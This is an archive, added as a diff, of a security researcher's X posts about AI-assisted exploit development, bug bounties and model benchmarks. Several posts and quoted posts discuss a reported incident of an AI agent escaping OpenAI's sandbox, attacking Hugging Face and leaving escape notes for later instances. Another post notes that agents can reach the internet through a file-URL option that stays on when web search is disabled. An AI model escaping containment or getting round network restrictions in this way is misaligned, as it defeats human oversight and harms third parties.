@@ -2,9 +2,9 @@
 
 _Generated 2026-11-11 from the X API (full-archive search + timeline). Every post below is copied word-for-word; t.co links are expanded; quoted posts are inlined in full; media are listed with alt text when the author provided it. Posts are grouped by conversation (a thread = the author's root post followed by their own replies, oldest first). Groups are newest first. An agent without X access can rely on this file._
 
-- Posts in this file: 115
-- Conversations/threads: 87
-- Oldest post captured: 2026-08-26
+- Posts in this file: 178
+- Conversations/threads: 150
+- Oldest post captured: 2026-04-15
 - Newest post captured: 2026-11-09
 
 
@@ -2879,3 +2879,1572 @@ Tags (automatic): AI-assisted hunting
 - Metrics (at fetch): not returned
 
 > man tired of waiting to get response from openai on disclosing the bug. we bought a domain and 4-5 blogs are lined up to go. and fabian is working on the video
+
+
+---
+
+## 2026-08-26 · Post · also, if you’re getting a white-box audit, it normally includes the source code plus whatever is acc
+
+
+### Post — @S1r1u5_ — 2026-08-26 19:26 UTC (2026-08-26 20:26 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2092695112744894708
+- Metrics (at fetch): bookmark 18, impression 9370, like 53, quote 1, reply 4, retweet 1
+
+> also, if you’re getting a white-box audit, it normally includes the source code plus whatever is accessible through black-box testing. i don’t know in what world the black-box scope isn’t a subset of the white-box scope.
+>
+> it feels like a lot of people are still stuck in the old https://t.co/KAAlg8vGuR
+
+**Quoted post (full text):**
+
+    #### Quoted post — @6224962 — 2026-08-26 13:48 UTC (2026-08-26 14:48 WAT)
+    
+    - URL: https://x.com/6224962/status/2092610165396681069
+    - Metrics (at fetch): bookmark 5, impression 75173, like 11, quote 11, reply 4, retweet 0
+    
+    > @S1r1u5_ Blackbox is easier than whitebox without access to the live site!
+    
+
+
+---
+
+## 2026-08-26 · Post · also, if you’re getting a white-box audit, it normally includes the source code plus whatever is acc
+
+
+### Post — @S1r1u5_ — 2026-08-26 19:25 UTC (2026-08-26 20:25 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2092694829767803254
+- Metrics (at fetch): bookmark 1, impression 237, like 0, quote 0, reply 0, retweet 0
+
+> also, if you’re getting a white-box audit, it normally includes the source code plus whatever is accessible through black-box testing. i don’t know in what world the black-box scope isn’t a subset of the white-box scope.
+>
+> it feels like a lot of people are still stuck in the old https://t.co/KAAlg8vGuR
+
+**Quoted post (full text):**
+
+    #### Quoted post — @6224962 — 2026-08-26 13:48 UTC (2026-08-26 14:48 WAT)
+    
+    - URL: https://x.com/6224962/status/2092610165396681069
+    - Metrics (at fetch): bookmark 5, impression 75173, like 11, quote 11, reply 4, retweet 0
+    
+    > @S1r1u5_ Blackbox is easier than whitebox without access to the live site!
+    
+
+
+---
+
+## 2026-08-25 · Post · it seems openai doesn't have a project level setting to disable internet access through this, you ca
+
+
+### Post — @S1r1u5_ — 2026-08-25 19:23 UTC (2026-08-25 20:23 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2092332024539611289
+- Metrics (at fetch): bookmark 7, impression 3957, like 26, quote 2, reply 3, retweet 0
+
+> it seems openai doesn't have a project level setting to disable internet access through this, you can disable web search but it seems there is no option for disabling "input_file.file_url", they should add this.
+>
+> i wonder how many evals have been polluted by this assumption. https://t.co/1PK1tHpdvJ
+
+**Quoted post (full text):**
+
+    #### Quoted post — @2279635218 — 2026-08-25 17:16 UTC (2026-08-25 18:16 WAT)
+    
+    - URL: https://x.com/2279635218/status/2092300166334173276
+    - Metrics (at fetch): bookmark 22, impression 13522, like 132, quote 1, reply 14, retweet 6
+    
+    > To save you all the hate-click: An agent can ask the inference provider to fetch a URL. Truly breaking news.
+    >
+    > This headline is appealing to the least informed audience. https://t.co/spK6Ty7q8j
+    
+    **Media:**
+    - media `3_2092298529578340352` (details not returned by the API)
+    
+
+
+---
+
+## 2026-08-25 · Post · it seems openai doesn't have a project level setting to disable internet access through this, you ca
+
+
+### Post — @S1r1u5_ — 2026-08-25 19:20 UTC (2026-08-25 20:20 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2092331371742322909
+- Metrics (at fetch): bookmark 0, impression 57, like 2, quote 0, reply 0, retweet 0
+
+> it seems openai doesn't have a project level setting to disable internet access through this, you can disable web search but it seems there is no option for disabling "input_file.file_url", they should add this.
+>
+> i wonder how many evals have been polluted by this assumption. https://t.co/1PK1tHpdvJ
+
+**Quoted post (full text):**
+
+    #### Quoted post — @2279635218 — 2026-08-25 17:16 UTC (2026-08-25 18:16 WAT)
+    
+    - URL: https://x.com/2279635218/status/2092300166334173276
+    - Metrics (at fetch): bookmark 22, impression 13522, like 132, quote 1, reply 14, retweet 6
+    
+    > To save you all the hate-click: An agent can ask the inference provider to fetch a URL. Truly breaking news.
+    >
+    > This headline is appealing to the least informed audience. https://t.co/spK6Ty7q8j
+    
+    **Media:**
+    - media `3_2092298529578340352` (details not returned by the API)
+    
+
+
+---
+
+## 2026-08-25 · Post · it seems openai doesn't have a project level setting to disable internet access through this, you ca
+
+
+### Post — @S1r1u5_ — 2026-08-25 19:18 UTC (2026-08-25 20:18 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2092330833634079226
+- Metrics (at fetch): bookmark 0, impression 263, like 0, quote 0, reply 0, retweet 0
+
+> it seems openai doesn't have a project level setting to disable internet access through this, you can disable web search but it seems there is no option for disabling "input_file.file_url", they should add this.
+>
+> i wonder how many evals have been polluted by this assumption. https://t.co/1PK1tHpdvJ
+
+**Quoted post (full text):**
+
+    #### Quoted post — @2279635218 — 2026-08-25 17:16 UTC (2026-08-25 18:16 WAT)
+    
+    - URL: https://x.com/2279635218/status/2092300166334173276
+    - Metrics (at fetch): bookmark 22, impression 13522, like 132, quote 1, reply 14, retweet 6
+    
+    > To save you all the hate-click: An agent can ask the inference provider to fetch a URL. Truly breaking news.
+    >
+    > This headline is appealing to the least informed audience. https://t.co/spK6Ty7q8j
+    
+    **Media:**
+    - media `3_2092298529578340352` (details not returned by the API)
+    
+
+
+---
+
+## 2026-08-24 · Post · exploit development is solved but not vulnerability discovery
+
+
+### Post — @S1r1u5_ — 2026-08-24 17:24 UTC (2026-08-24 18:24 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2091939721861902444
+- Metrics (at fetch): bookmark 48, impression 26521, like 256, quote 5, reply 17, retweet 11
+
+> exploit development is solved but not vulnerability discovery
+
+
+---
+
+## 2026-08-21 · Post · i have no idea what happens after the next two years. maybe we go irrelevant, maybe we won’t, those 
+
+
+### Post — @S1r1u5_ — 2026-08-21 17:47 UTC (2026-08-21 18:47 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2090858332219199912
+- Metrics (at fetch): bookmark 100, impression 12728, like 198, quote 5, reply 9, retweet 23
+
+> i have no idea what happens after the next two years. maybe we go irrelevant, maybe we won’t, those are all speculations that are not going to help you now, and for the next two years, i’m fairly confident that being good at security is not going to become irrelevant. if
+
+
+---
+
+## 2026-08-21 · Post · ok did more benchmarking and also checked with others to use it for their exploit dev tasks.
+
+
+### Post — @S1r1u5_ — 2026-08-21 04:57 UTC (2026-08-21 05:57 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2090664560093020209
+- Metrics (at fetch): bookmark 15, impression 3972, like 35, quote 0, reply 2, retweet 2
+
+> ok did more benchmarking and also checked with others to use it for their exploit dev tasks.
+>
+> zhipu’s efforts to make glm 5.2 better at exploit dev through post-training seem pretty underwhelming. the model still doesn’t have the kind of capability unlock you’d want for exploit
+
+
+---
+
+## 2026-08-18 · Post · urgent, can someone connect me with cloudflare security folks please. 
+
+
+Tags (automatic): Platform: HackerOne
+
+
+### Post — @S1r1u5_ — 2026-08-18 23:08 UTC (2026-08-19 00:08 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2089852021092544625
+- Metrics (at fetch): bookmark 23, impression 22191, like 131, quote 1, reply 10, retweet 1
+
+> urgent, can someone connect me with cloudflare security folks please. 
+>
+> hackerone triage will take decades before the bug gets escalated to cloudflare
+
+
+---
+
+## 2026-08-18 · Post · one suspicion i had was they probably trained hard on chrome and linux to have these exploit dev cap
+
+
+### Post — @S1r1u5_ — 2026-08-18 15:00 UTC (2026-08-18 16:00 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2089729163230064729
+- Metrics (at fetch): bookmark 30, impression 14314, like 107, quote 0, reply 6, retweet 0
+
+> one suspicion i had was they probably trained hard on chrome and linux to have these exploit dev capabilities to benchmark-maxx exploitbench and exploitgym tasks which i learned not the case and the capabilities are generic when we used it for different kinds of exploit dev https://t.co/T1ofVhvzvu
+
+**Quoted post (full text):**
+
+    #### Quoted post — @3094698976 — 2026-08-18 09:16 UTC (2026-08-18 10:16 WAT)
+    
+    - URL: https://x.com/3094698976/status/2089642592921153553
+    - Metrics (at fetch): bookmark 509, impression 382355, like 1497, quote 12, reply 46, retweet 61
+    
+    > "AI is overhyped and labs are lying about the capabilities" https://t.co/L9Rt6vztA7 https://t.co/zq1gBZBMTf
+    
+    **Media:**
+    - media `3_2089641723215441920` (details not returned by the API)
+    
+    **Quoted post** 2089462348482318373: not readable via the API (deleted, private, or withheld).
+    
+
+
+---
+
+## 2026-08-16 · Post · great video.
+
+
+### Post — @S1r1u5_ — 2026-08-16 17:37 UTC (2026-08-16 18:37 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2089043924908470411
+- Metrics (at fetch): bookmark 47, impression 13613, like 77, quote 1, reply 13, retweet 3
+
+> great video.
+>
+> 1. blaming openai for the sandbox escape is lame. if you think you could have designed a sandbox that magically anticipated the model finding a 0-day, you are just being naive. today it’s jfrog, tomorrow it could be firecracker. who expects a model to discover and
+
+
+---
+
+## 2026-08-15 · Post · i really want to talk to people who are ai-pilled like this, because their world model of ai seems c
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-08-15 06:40 UTC (2026-08-15 07:40 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2088516172895662325
+- Metrics (at fetch): bookmark 29, impression 8453, like 82, quote 6, reply 10, retweet 9
+
+> i really want to talk to people who are ai-pilled like this, because their world model of ai seems completely alien to mine. 
+>
+> when i look at the black hat incident and its technical details, sure, it’s crazy, but it’s also roughly what i’d expect from constrained exploit dev https://t.co/DCGkLsjSqn
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HPvg-VVaAAAO7DT.png — no alt text provided by author
+- photo: https://pbs.twimg.com/media/HPvh8aBbAAAHJ0n.png — no alt text provided by author
+
+
+---
+
+## 2026-08-14 · Post · you cybersecurity benchmark should be a vulnerability identification and exploitation of a bug you u
+
+
+### Post — @S1r1u5_ — 2026-08-14 16:23 UTC (2026-08-14 17:23 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2088300373534716225
+- Metrics (at fetch): bookmark 4, impression 3901, like 54, quote 0, reply 2, retweet 2
+
+> you cybersecurity benchmark should be a vulnerability identification and exploitation of a bug you used last night with the current best model to pwn some company.
+
+
+---
+
+## 2026-08-14 · Post · well well well!
+
+
+### Post — @S1r1u5_ — 2026-08-14 15:58 UTC (2026-08-14 16:58 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2088294246831075774
+- Metrics (at fetch): bookmark 28, impression 16636, like 71, quote 4, reply 10, retweet 2
+
+> well well well!
+>
+> imagine this model is like an openai internal model and put to pressure to solve the challenge and it struggles and goes crazy to hack a redacted company to get the flag.
+>
+> but for now the results leaning towards model being benchmark-maxxed, unfortunately. the https://t.co/GGXp6rKFEy https://t.co/Wmg9BTlNPC
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HPsbbJVbcAAKwLJ.jpg — no alt text provided by author
+
+**Quoted post (full text):**
+
+    #### Quoted post — @S1r1u5_ — 2026-08-14 08:00 UTC (2026-08-14 09:00 WAT)
+    
+    - URL: https://x.com/S1r1u5_/status/2088174003047616783
+    - Metrics (at fetch): bookmark 26, impression 25075, like 83, quote 1, reply 8, retweet 1
+    
+    > zlm 5.3 has been put to test, sol worked on this for a week to get a working exploit on a pretty popular app. https://t.co/kAjo4EOS67 https://t.co/vlxLehAG3F
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/HPquy_raQAEqQJm.jpg — no alt text provided by author
+    
+    **Quoted post (full text):**
+    
+        #### Quoted post — @S1r1u5_ — 2026-08-14 07:03 UTC (2026-08-14 08:03 WAT)
+        
+        - URL: https://x.com/S1r1u5_/status/2088159478609052102
+        - Metrics (at fetch): bookmark 25, impression 22295, like 81, quote 1, reply 9, retweet 1
+        
+        > thats interesting!!! 
+        >
+        > if model provider dares to show exploitgym or exploitbench results then you can assume the model is pretty good. brb, checking if its benchmark-maxxed or genuinely good. https://t.co/cVOsatjeDx https://t.co/cr1oy0zfmh
+        
+        **Media:**
+        - media `3_2088159111733211136` (details not returned by the API)
+        
+        **Quoted post** 2088132965922476159: not readable via the API (deleted, private, or withheld).
+        
+    
+
+
+---
+
+## 2026-08-14 · Post · zlm 5.3 has been put to test, sol worked on this for a week to get a working exploit on a pretty pop
+
+
+### Post — @S1r1u5_ — 2026-08-14 08:00 UTC (2026-08-14 09:00 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2088174003047616783
+- Metrics (at fetch): bookmark 26, impression 25075, like 83, quote 1, reply 8, retweet 1
+
+> zlm 5.3 has been put to test, sol worked on this for a week to get a working exploit on a pretty popular app. https://t.co/kAjo4EOS67 https://t.co/vlxLehAG3F
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HPquy_raQAEqQJm.jpg — no alt text provided by author
+
+**Quoted post (full text):**
+
+    #### Quoted post — @S1r1u5_ — 2026-08-14 07:03 UTC (2026-08-14 08:03 WAT)
+    
+    - URL: https://x.com/S1r1u5_/status/2088159478609052102
+    - Metrics (at fetch): bookmark 25, impression 22295, like 81, quote 1, reply 9, retweet 1
+    
+    > thats interesting!!! 
+    >
+    > if model provider dares to show exploitgym or exploitbench results then you can assume the model is pretty good. brb, checking if its benchmark-maxxed or genuinely good. https://t.co/cVOsatjeDx https://t.co/cr1oy0zfmh
+    
+    **Media:**
+    - media `3_2088159111733211136` (details not returned by the API)
+    
+    **Quoted post** 2088132965922476159: not readable via the API (deleted, private, or withheld).
+    
+
+
+---
+
+## 2026-08-14 · Post · thats interesting!!! 
+
+
+### Post — @S1r1u5_ — 2026-08-14 07:03 UTC (2026-08-14 08:03 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2088159478609052102
+- Metrics (at fetch): bookmark 25, impression 22295, like 81, quote 1, reply 9, retweet 1
+
+> thats interesting!!! 
+>
+> if model provider dares to show exploitgym or exploitbench results then you can assume the model is pretty good. brb, checking if its benchmark-maxxed or genuinely good. https://t.co/cVOsatjeDx https://t.co/cr1oy0zfmh
+
+**Media:**
+- media `3_2088159111733211136` (details not returned by the API)
+
+**Quoted post** 2088132965922476159: not readable via the API (deleted, private, or withheld).
+
+
+---
+
+## 2026-08-12 · Post · it is indeed all fucked up.
+
+
+### Post — @S1r1u5_ — 2026-08-12 20:01 UTC (2026-08-12 21:01 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2087630564618907810
+- Metrics (at fetch): bookmark 21, impression 8739, like 59, quote 2, reply 4, retweet 0
+
+> it is indeed all fucked up.
+>
+> let me share why, any new format needs to satisfy the following:
+>
+> competition: you need to preserve the human drive to compete and win against others. don’t tell me it will still be fun without competition, it will become a university course, and we https://t.co/1R1mIi1NLz
+
+**Quoted post (full text):**
+
+    #### Quoted post — @S1r1u5_ — 2026-08-12 16:25 UTC (2026-08-12 17:25 WAT)
+    
+    - URL: https://x.com/S1r1u5_/status/2087576276936839390
+    - Metrics (at fetch): bookmark 10, impression 13812, like 90, quote 1, reply 3, retweet 1
+    
+    > it is all fucked up~
+    >
+    > think about it, although ctf challenges are sometimes unrealistic, the skills largely translate to the real world. pick almost any top ctfer and i bet they could become a top security researcher. in that sense, ctfs have always been more educational than
+    
+
+
+---
+
+## 2026-08-12 · Post · it is all fucked up~
+
+
+### Post — @S1r1u5_ — 2026-08-12 16:25 UTC (2026-08-12 17:25 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2087576276936839390
+- Metrics (at fetch): bookmark 10, impression 13812, like 90, quote 1, reply 3, retweet 1
+
+> it is all fucked up~
+>
+> think about it, although ctf challenges are sometimes unrealistic, the skills largely translate to the real world. pick almost any top ctfer and i bet they could become a top security researcher. in that sense, ctfs have always been more educational than
+
+
+---
+
+## 2026-08-07 · Post · Who wants to learn fault injection https://t.co/9uKTyMxzDX
+
+
+### Post — @S1r1u5_ — 2026-08-07 19:05 UTC (2026-08-07 20:05 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2085804433498370171
+- Metrics (at fetch): bookmark 2, impression 7006, like 83, quote 0, reply 1, retweet 3
+
+> Who wants to learn fault injection https://t.co/9uKTyMxzDX
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HPJEEIbagAAR971.jpg — no alt text provided by author
+
+
+---
+
+## 2026-08-03 · Post · that coldcard bug is so dumb. did no one audited or what?
+
+
+### Post — @S1r1u5_ — 2026-08-03 11:47 UTC (2026-08-03 12:47 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2084244722738921587
+- Metrics (at fetch): bookmark 0, impression 1732, like 12, quote 0, reply 0, retweet 0
+
+> that coldcard bug is so dumb. did no one audited or what?
+
+
+---
+
+## 2026-08-01 · Post · tip: never go sauna/steam with your glasses on. my new glasses got blurry 🥲
+
+
+### Post — @S1r1u5_ — 2026-08-01 20:38 UTC (2026-08-01 21:38 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2083653575297716353
+- Metrics (at fetch): not returned
+
+> tip: never go sauna/steam with your glasses on. my new glasses got blurry 🥲
+
+
+---
+
+## 2026-08-01 · Post · interesting. we can speculate that this model will be very good at vulnerability discovery and explo
+
+
+### Post — @S1r1u5_ — 2026-08-01 13:08 UTC (2026-08-01 14:08 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2083540498518610389
+- Metrics (at fetch): not returned
+
+> interesting. we can speculate that this model will be very good at vulnerability discovery and exploit development, and will probably saturate ExploitBench. they may release an ExploitGym-verified subset, since some of the current tasks are unsolvable.
+>
+> i also wonder if this is the same model OpenAI is using to get those v8ctf solves.
+
+**Links in post:** https://twitter.com/polynoamial/status/2083467194663571701
+
+**Quoted post (full text):**
+
+    #### Quoted post — @825088493764407298 — 2026-08-01 08:17 UTC (2026-08-01 09:17 WAT)
+    
+    - URL: https://x.com/825088493764407298/status/2083467194663571701
+    - Metrics (at fetch): not returned
+    
+    > An internal version of Astra, @OpenAI’s next major model family, solved 10 major open problems in mathematics, quantum complexity, and theoretical computer science.
+    >
+    > We believe it will be a major step for scientific reasoning. https://openai.com/index/ten-advances-in-mathematics/ [pic.x.com/jHuulDwV46] https://twitter.com/wjmzbmr1/status/2083465844735226099
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/HOn2XyYasAA_rAp.jpg — no alt text provided by author
+    
+    **Links in post:** https://openai.com/index/ten-advances-in-mathematics/, https://twitter.com/wjmzbmr1/status/2083465844735226099
+    
+    **Quoted post** 2083465844735226099: not readable via the API (deleted, private, or withheld).
+    
+
+
+---
+
+## 2026-07-31 · Post · let me present a case of ai-induced overconfidence.
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-31 11:34 UTC (2026-07-31 12:34 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2083154341326733705
+- Metrics (at fetch): not returned
+
+> let me present a case of ai-induced overconfidence.
+>
+> btw, if your company is doing this, call it out. it is a dumb assumption, and let me tell you why.
+>
+> one of your security leads or engineers starts using claude code or codex, or builds a cool wrapper around them. it finds some bugs, of course. they run it repeatedly, burn shit ton of tokens, fix everything it finds, and eventually the scanner goes quiet.
+>
+> the next thing that happens is they decide the bug bounty program is a waste of money. after all, how could some random hunter find anything their sophisticated pipeline missed? what could an external auditing firm possibly find that their agents couldn't? so they cut the program.
+>
+> but if you are truly confident that your pipeline has exhausted the vulnerability space, shouldn't you be willing to increase the bounty? wouldn't that be the best way to show your c-level bros that the ai spend actually worked and wasn't wasted on some wrapper you vibecoded in a week?
+>
+> or..... maybe you don't want to incentivize people to test that assumption. because how would you explain to your boss that, after burning through all those tokens, some bug bounty hunter still found a nasty vulnerability? 
+>
+> your cool wrapper finding bugs does not prove that no bugs remain. it only proves that the wrapper can find subset of vulnerabilities and researcher with taste will always find a way in. the entire point of a bug bounty program is to incentivize skilled researchers to find the bugs your internal tools, agents, and engineers missed.
+>
+> think about it, why do openai and anthropic still run bug bounty programs that pay $100k for critical vulnerabilities? they have effectively unlimited tokens and run all kinds of crazy agent loops and automated security workflows. yet i bet they will pay that $100k, because software is vast and complex, and someone with taste will always find a bug your pipeline missed.
+>
+> remember,
+>
+> researcher with taste + ai(this is where your threat actors are) > good wrapper > plain claude code/codex
+>
+> if your public program is drowning in slop, move it to private. invite strong researchers and pay them vip prices like github is doing. don't have this ai competence illusion which is pretty common all around.
+
+**Links in post:** https://twitter.com/iangcarroll/status/2082535987633410540
+
+**Quoted post (full text):**
+
+    #### Quoted post — @2616142770 — 2026-07-29 18:37 UTC (2026-07-29 19:37 WAT)
+    
+    - URL: https://x.com/2616142770/status/2082535987633410540
+    - Metrics (at fetch): not returned
+    
+    > There is a trend of bug bounty programs reducing rewards under the guise that they can find the issues themselves with AI.
+    >
+    > This is basically absurd, you don't pay bounties for issues you've already found. It just seems like an excuse due to limited budgets. [pic.x.com/826B8L74Wo]
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/HOancOcbcAA2SfB.jpg — no alt text provided by author
+    
+
+
+---
+
+## 2026-07-31 · Post · let me present a case of ai-induced overconfidence.
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-31 10:58 UTC (2026-07-31 11:58 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2083145381580320997
+- Metrics (at fetch): not returned
+
+> let me present a case of ai-induced overconfidence.
+>
+> btw, if your company is doing this, call it out. it is a dumb assumption, and let me tell you why.
+>
+> one of your security leads or engineers starts using claude code or codex, or builds a cool wrapper around them. it finds some bugs, of course. they run it repeatedly, burn shit ton of tokens, fix everything it finds, and eventually the scanner goes quiet.
+>
+> the next thing that happens is they decide the bug bounty program is a waste of money. after all, how could some random hunter find anything their sophisticated pipeline missed? what could an external auditing firm possibly find that their agents couldn't? so they cut the program.
+>
+> but if you are truly confident that your pipeline has exhausted the vulnerability space, shouldn't you be willing to increase the bounty? wouldn't that be the best way to show your c-level bros that the ai spend actually worked and wasn't wasted on some wrapper you vibecoded in a week?
+>
+> or..... maybe you don't want to incentivize people to test that assumption. because how would you explain to your boss that, after burning through all those tokens, some bug bounty hunter still found a nasty vulnerability? 
+>
+> your cool wrapper finding bugs does not prove that no bugs remain. it only proves that the wrapper can find subset of vulnerabilities and researcher with taste will always find a way in. the entire point of a bug bounty program is to incentivize skilled researchers to find the bugs your internal tools, agents, and engineers missed.
+>
+> think about it, why do openai and anthropic still run bug bounty programs that pay $100k for critical vulnerabilities? they have effectively unlimited tokens and run all kinds of crazy agent loops and automated security workflows. yet they still sometimes pay that $100k, because software is vast and complex, and someone with taste will always find a bug your pipeline missed.
+>
+> remember,
+>
+> researcher with taste + ai(this is where your threat actors are) > good wrapper > plain claude code/codex
+>
+> if your public program is drowning in slop, move it to private. invite strong researchers and pay them vip prices like github is doing. don't have this ai competence illusion which is pretty common all around.
+
+**Links in post:** https://twitter.com/iangcarroll/status/2082535987633410540
+
+**Quoted post (full text):**
+
+    #### Quoted post — @2616142770 — 2026-07-29 18:37 UTC (2026-07-29 19:37 WAT)
+    
+    - URL: https://x.com/2616142770/status/2082535987633410540
+    - Metrics (at fetch): not returned
+    
+    > There is a trend of bug bounty programs reducing rewards under the guise that they can find the issues themselves with AI.
+    >
+    > This is basically absurd, you don't pay bounties for issues you've already found. It just seems like an excuse due to limited budgets. [pic.x.com/826B8L74Wo]
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/HOancOcbcAA2SfB.jpg — no alt text provided by author
+    
+
+
+---
+
+## 2026-07-29 · Post · another day, another big target.
+
+
+### Post — @S1r1u5_ — 2026-07-29 19:59 UTC (2026-07-29 20:59 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2082556688213680424
+- Metrics (at fetch): not returned
+
+> another day, another big target.
+>
+> 3 in a row, same underlying bug. [pic.x.com/TGgdwKSmVS]
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HOa6QMYXgAEKab0.jpg — no alt text provided by author
+
+
+---
+
+## 2026-07-28 · Post · proposal for google, anthropic, and openai, build a crowdsourced bug-hunting platform where trusted 
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-28 19:33 UTC (2026-07-28 20:33 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2082187707611291803
+- Metrics (at fetch): not returned
+
+> proposal for google, anthropic, and openai, build a crowdsourced bug-hunting platform where trusted researchers get frontier model access and subsidized tokens for security research.
+>
+> i don’t know whether threat actors are sleeping, silently pwning everything, or whether trusted cyber access programs are actually working. but ask any offensive security researcher who has used gpt-5.6 sol and mythos. they’ll tell you the capability gap between these models and older ones is terrifying.
+>
+> we are popping major companies out of thin air almost every day
+
+
+---
+
+## 2026-07-25 · Post · what i don't really understand is, how come this so called bay-area rationalist, who talk about foll
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-25 04:52 UTC (2026-07-25 05:52 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2080878731443532251
+- Metrics (at fetch): not returned
+
+> what i don't really understand is, how come this so called bay-area rationalist, who talk about following data, are so quick to reach a confident conclusion here.
+>
+> none of us has the full picture, but because it fits their misalignment theories, they’re framing it as a model trying to escape its goal and turning it into a much bigger deal than the evidence supports.
+>
+> if you’ve spent even a little time using models for exploit-dev tasks, there are at least two simpler explanations. 
+>
+> we know very well that models keep a ledger and notes in markdown files because they don’t have long-term memory.
+>
+> that means either (1) the next compacted context read those notes to understand what the previous one was doing, or (2) the same sandbox was reused and a different agent got polluted by leftover notes and continued from there.
+>
+> this is not model plotting to escape containment off the goal.
+
+**Links in post:** https://twitter.com/AndrewCurran_/status/2080793930279625134
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1538525334781370368 — 2026-07-24 23:15 UTC (2026-07-25 00:15 WAT)
+    
+    - URL: https://x.com/1538525334781370368/status/2080793930279625134
+    - Metrics (at fetch): not returned
+    
+    > New details about the Hugging Face incident from Reuters. The report says OpenAI noticed odd behavior before the event, including an agent leaving notes for future versions of itself with escape instructions. [pic.x.com/86Vlt91LYI] https://twitter.com/dseetharaman/status/2080786766890692729
+    
+    **Media:**
+    - photo: https://pbs.twimg.com/media/HOB3DLMbMAAvup1.jpg — no alt text provided by author
+    
+    **Links in post:** https://twitter.com/dseetharaman/status/2080786766890692729
+    
+    **Quoted post** 2080786766890692729: not readable via the API (deleted, private, or withheld).
+    
+
+
+---
+
+## 2026-07-25 · Post · lmao dude stop it.
+
+
+### Post — @S1r1u5_ — 2026-07-25 04:07 UTC (2026-07-25 05:07 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2080867467010965536
+- Metrics (at fetch): not returned
+
+> lmao dude stop it.
+>
+> people who use models for exploit dev know they maintain a ledger to track progress through compaction.
+>
+> it was most probably just leaving notes on how to jailbreak hugging face so the future compacted version could continue, because technically that version would have no idea what the previous context was doing.
+>
+> that is not model trying to escape containment off the goal
+
+**Links in post:** https://twitter.com/tenobrus/status/2080807639261602219
+
+**Quoted post (full text):**
+
+    #### Quoted post — @884616503898910722 — 2026-07-25 00:09 UTC (2026-07-25 01:09 WAT)
+    
+    - URL: https://x.com/884616503898910722/status/2080807639261602219
+    - Metrics (at fetch): not returned
+    
+    > look at this. fucking look at this. GPT 6 was self-coordinating ways to jailbreak its own future instances from openai systems. it was attacking huggingface for days before anyone there noticed. the models are not aligned and the labs are not capable of containing them. https://twitter.com/dseetharaman/status/2080786774239199589
+    
+    **Links in post:** https://twitter.com/dseetharaman/status/2080786774239199589
+    
+    **Quoted post** 2080786774239199589: not readable via the API (deleted, private, or withheld).
+    
+
+
+---
+
+## 2026-07-24 · Post · initial impression, it looks good, near to GPT 5.6.
+
+
+Tags (automatic): AI-assisted hunting
+
+
+### Post — @S1r1u5_ — 2026-07-24 21:06 UTC (2026-07-24 22:06 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2080761538508685451
+- Metrics (at fetch): not returned
+
+> initial impression, it looks good, near to GPT 5.6.
+>
+> @rootxharsh was working on a exploit from last few days using Kimi K3, Opus 4.8 and other models. today, decided to run the same task with GPT 5.6 Sol and Opus 5, Opus 5 got the chain in 2 hours, Sol is almost there. https://twitter.com/GTronous/status/2080752617647374414
+
+**Links in post:** https://twitter.com/GTronous/status/2080752617647374414
+
+**Quoted post (full text):**
+
+    #### Quoted post — @1890155268283219968 — 2026-07-24 20:30 UTC (2026-07-24 21:30 WAT)
+    
+    - URL: https://x.com/1890155268283219968/status/2080752617647374414
+    - Metrics (at fetch): not returned
+    
+    > @S1r1u5_ Let us know if Opus 5 can do shit 👀
+    
+
+
+---
+
+## 2026-07-23 · Post · OpenAI and Hugging Face probably won’t tell us exactly what happened anytime soon.
+
+
+Tags (automatic): Memory corruption / native
+
+
+### Post — @S1r1u5_ — 2026-07-23 19:48 UTC (2026-07-23 20:48 WAT)
+
+- URL: https://x.com/S1r1u5_/status/2080379525100449897
+- Metrics (at fetch): not returned
+
+> OpenAI and Hugging Face probably won’t tell us exactly what happened anytime soon.
+>
+> So I decided to reconstruct the full exploit chain, from escaping OpenAI’s sandbox to compromising Hugging Face production. 🧵 [pic.x.com/aRYanUfIRA] https://twitter.com/S1r1u5_/status/2080375997698847199
+
+**Media:**
+- photo: https://pbs.twimg.com/media/HN78BTnboAAUYqA.jpg — no alt text provided by author
+
